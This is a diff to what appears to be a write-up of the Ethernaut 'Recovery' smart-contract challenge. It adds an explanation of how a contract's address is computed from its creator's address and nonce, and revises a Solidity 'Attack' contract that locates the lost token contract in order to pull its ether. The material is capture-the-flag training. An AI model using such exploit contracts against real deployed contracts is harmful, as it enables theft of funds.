@@ -54,6 +54,16 @@ Challenge's message:
 > A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address. This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.
 
 
+## Contract Address Calculating
+
+
+```solidity
+bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01)));
+address addr = address(uint160(uint256(hash)));
+```
+
+More about [this topic.](https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed)
+
 # Subverting
 
 ```solidity
@@ -64,9 +74,12 @@ import './Recovery.sol';
 contract Attack{
 
     SimpleToken target;
+    address public addr;
 
-    constructor(address payable _target){
-        target = SimpleToken(_target);
+    constructor(address payable _challenge){
+        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _challenge, bytes1(0x01)));
+        addr = address(uint160(uint256(hash)));
+        target = SimpleToken(addr);
     }
 
     function attack()external{
@@ -75,6 +88,11 @@ contract Attack{
 
 }
 ```
+
+
+<p align="center"><img src=""></p>
+
+<p align="center"><img src=""></p>
 
 
 Ethernaut's message:
